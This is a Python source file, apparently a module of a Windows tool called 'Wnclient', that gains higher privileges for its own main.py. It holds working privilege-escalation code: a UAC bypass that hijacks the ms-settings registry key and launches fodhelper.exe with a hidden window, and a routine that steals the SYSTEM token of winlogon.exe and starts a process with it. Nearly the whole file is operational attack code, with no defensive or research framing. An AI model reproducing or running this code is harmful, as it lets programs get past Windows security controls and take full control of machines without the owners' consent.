import ctypes
import platform
import lwjgl
import sys
import os
import pathlib
import subprocess
import winreg
import ctypes
import sys
from ctypes import wintypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def Universal():
    if platform.system() == 'Windows':
        if not is_admin():
            res_code = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, os.path.join(pathlib.Path(__file__).parent.parent.parent,"main.py"), None, 1)
            if res_code <= 32:
                lwjgl.error(f"Failed to elevate power, return: {res_code}")
            else:
                lwjgl.info("You have acquired administrator privileges, please use the new window")
                exit()
    else:
        lwjgl.error("It can only run on Windows")

def UAC_Bypass():
    payload_cmd = f'cmd.exe /c "cd /d "{pathlib.Path(__file__).parent.parent.parent}" && "{sys.executable}" main.py"'
    try:
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        

        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except WindowsError:
            pass
        
   
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_cmd)
        
        winreg.CloseKey(key)
        
    except Exception as e:
        lwjgl.error(e)
        
    
    try:
        system32 = os.path.join(os.environ['WINDIR'], 'System32')
        fodhelper_path = os.path.join(system32, 'fodhelper.exe')
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        subprocess.Popen([fodhelper_path], startupinfo=startupinfo, shell=True,start_new_session=True)
        lwjgl.info("Create Success")
        lwjgl.info("You can use Wnclient in a new window")
        sys.exit()
        
        
    except Exception as e:
        lwjgl.error(e)


def GetSystem_by_Winlogon():
    
    # Load necessary Windows DLLs
    kernel32 = ctypes.WinDLL('kernel32')
    advapi32 = ctypes.WinDLL('advapi32')
    psapi = ctypes.WinDLL('psapi')
    
    # Define constants
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    TOKEN_QUERY = 0x0008
    TOKEN_DUPLICATE = 0x0002
    TOKEN_ALL_ACCESS = 0xF01FF
    SecurityImpersonation = 2
    TokenPrimary = 1
    MAX_PATH = 260
    TH32CS_SNAPPROCESS = 0x00000002
    PROCESS_VM_READ = 0x0010
    PROCESS_QUERY_INFORMATION = 0x0400
    
    # Define function prototypes
    kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    kernel32.OpenProcess.restype = wintypes.HANDLE
    
    kernel32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
    kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE
    
    kernel32.Process32FirstW.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
    kernel32.Process32FirstW.restype = wintypes.BOOL
    
    kernel32.Process32NextW.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
    kernel32.Process32NextW.restype = wintypes.BOOL
    
    psapi.EnumProcesses.argtypes = [ctypes.POINTER(wintypes.DWORD), wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    psapi.EnumProcesses.restype = wintypes.BOOL
    
    psapi.GetProcessImageFileNameW.argtypes = [wintypes.HANDLE, ctypes.c_wchar_p, wintypes.DWORD]
    psapi.GetProcessImageFileNameW.restype = wintypes.DWORD
    
    advapi32.OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
    advapi32.OpenProcessToken.restype = wintypes.BOOL
    
    advapi32.DuplicateTokenEx.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        ctypes.c_void_p,
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.HANDLE)
    ]
    advapi32.DuplicateTokenEx.restype = wintypes.BOOL
    
    advapi32.CreateProcessWithTokenW.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_void_p
    ]
    advapi32.CreateProcessWithTokenW.restype = wintypes.BOOL
    
    kernel32.GetLastError.restype = wintypes.DWORD
    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
    kernel32.CloseHandle.restype = wintypes.BOOL
    
    def get_winlogon_pid():
        """Automatically retrieve the PID of the WinLogon process."""
        
        # Method 1: Enumerate processes using EnumProcesses
        print("[*] Enumerating processes to find WinLogon...")
        
        # Get process list
        process_ids = (wintypes.DWORD * 1024)()
        bytes_returned = wintypes.DWORD()
        
        if not psapi.EnumProcesses(process_ids, ctypes.sizeof(process_ids), ctypes.byref(bytes_returned)):
            print(f"[!] EnumProcesses failed: {kernel32.GetLastError()}")
            return None
        
        num_processes = bytes_returned.value // ctypes.sizeof(wintypes.DWORD)
        
        for i in range(num_processes):
            pid = process_ids[i]
            if pid == 0:
                continue
            
            # Open process to get its name
            hProc = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
            if hProc:
                try:
                    # Get process image filename
                    filename = ctypes.create_unicode_buffer(MAX_PATH)
                    length = psapi.GetProcessImageFileNameW(hProc, filename, MAX_PATH)
                    
                    if length > 0:
                        # Check if it's winlogon.exe
                        filepath = filename.value.lower()
                        if "winlogon.exe" in filepath:
                            print(f"[+] Found WinLogon process: PID={pid}, Path={filepath}")
                            return pid
                finally:
                    kernel32.CloseHandle(hProc)
        
        # Method 2: Use Toolhelp32Snapshot as fallback
        print("[*] Attempting to find using Toolhelp32 snapshot...")
        
        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD),
                ("cntUsage", wintypes.DWORD),
                ("th32ProcessID", wintypes.DWORD),
                ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
                ("th32ModuleID", wintypes.DWORD),
                ("cntThreads", wintypes.DWORD),
                ("th32ParentProcessID", wintypes.DWORD),
                ("pcPriClassBase", wintypes.LONG),
                ("dwFlags", wintypes.DWORD),
                ("szExeFile", ctypes.c_wchar * MAX_PATH)
            ]
        
        hSnapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if hSnapshot == wintypes.HANDLE(-1):
            print(f"[!] Failed to create process snapshot: {kernel32.GetLastError()}")
            return None
        
        try:
            process_entry = PROCESSENTRY32()
            process_entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
            
            if kernel32.Process32FirstW(hSnapshot, ctypes.byref(process_entry)):
                while True:
                    if "winlogon.exe" in process_entry.szExeFile.lower():
                        print(f"[+] Found WinLogon process: PID={process_entry.th32ProcessID}, Name={process_entry.szExeFile}")
                        return process_entry.th32ProcessID
                    
                    if not kernel32.Process32NextW(hSnapshot, ctypes.byref(process_entry)):
                        break
        finally:
            kernel32.CloseHandle(hSnapshot)
        
        print("[!] Could not find WinLogon process")
        return None
    
    try:
        # Automatically retrieve WinLogon PID
        winlogon_pid = get_winlogon_pid()
        if not winlogon_pid:
            # If auto-retrieval fails, allow manual input
            try:
                winlogon_pid = int(input("Auto-retrieval failed. Please enter WinLogon PID: "))
            except ValueError:
                print("Invalid PID. Please enter a numeric value.")
                return 1
        
        print(f"[*] Using WinLogon PID: {winlogon_pid}")
        
        # Open the process
        hProc = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, winlogon_pid)
        if not hProc:
            print(f"[!] OpenProcess failed: {kernel32.GetLastError()}")
            return 1
        
        # Open process token
        hToken = wintypes.HANDLE()
        if not advapi32.OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, ctypes.byref(hToken)):
            print(f"[!] OpenProcessToken failed: {kernel32.GetLastError()}")
            kernel32.CloseHandle(hProc)
            return 1
        
        # Duplicate token
        hSysToken = wintypes.HANDLE()
        if not advapi32.DuplicateTokenEx(
            hToken, 
            TOKEN_ALL_ACCESS, 
            None, 
            SecurityImpersonation, 
            TokenPrimary, 
            ctypes.byref(hSysToken)
        ):
            print(f"[!] DuplicateTokenEx failed: {kernel32.GetLastError()}")
            kernel32.CloseHandle(hToken)
            kernel32.CloseHandle(hProc)
            return 1
        
        # Create process structures
        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ("cb", wintypes.DWORD),
                ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR),
                ("lpTitle", wintypes.LPWSTR),
                ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.c_void_p),
                ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE),
            ]
        
        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("hProcess", wintypes.HANDLE),
                ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId", wintypes.DWORD),
            ]
        
        si = STARTUPINFO()
        si.cb = ctypes.sizeof(STARTUPINFO)
        pi = PROCESS_INFORMATION()
        python_exe = sys.executable
        script_path = os.path.join(pathlib.Path(__file__).parent.parent.parent, "main.py")
        working_dir = str(pathlib.Path(__file__).parent.parent.parent)

 
        command_line = f'"{python_exe}" "{script_path}"'

        if not advapi32.CreateProcessWithTokenW(
            hSysToken,
            0,
            None,  # lpApplicationName 可以为 None，系统会从 lpCommandLine 解析
            command_line, 
            0,
            None,
            working_dir,  # 工作目录
            ctypes.byref(si),
            ctypes.byref(pi)
        ):
            error_code = kernel32.GetLastError()
            print(f"[!] CreateProcessWithTokenW failed: {error_code}")
            return 1
        else:
            print("[+] Successfully created process using WinLogon token!")
            print(f"[*] New process PID: {pi.dwProcessId}")
            sys.exit(0)
        
        # Cleanup handles
        kernel32.CloseHandle(hSysToken)
        kernel32.CloseHandle(hToken)
        kernel32.CloseHandle(hProc)
        kernel32.CloseHandle(pi.hProcess)
        kernel32.CloseHandle(pi.hThread)
        
        return pi.dwProcessId
        
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        return None

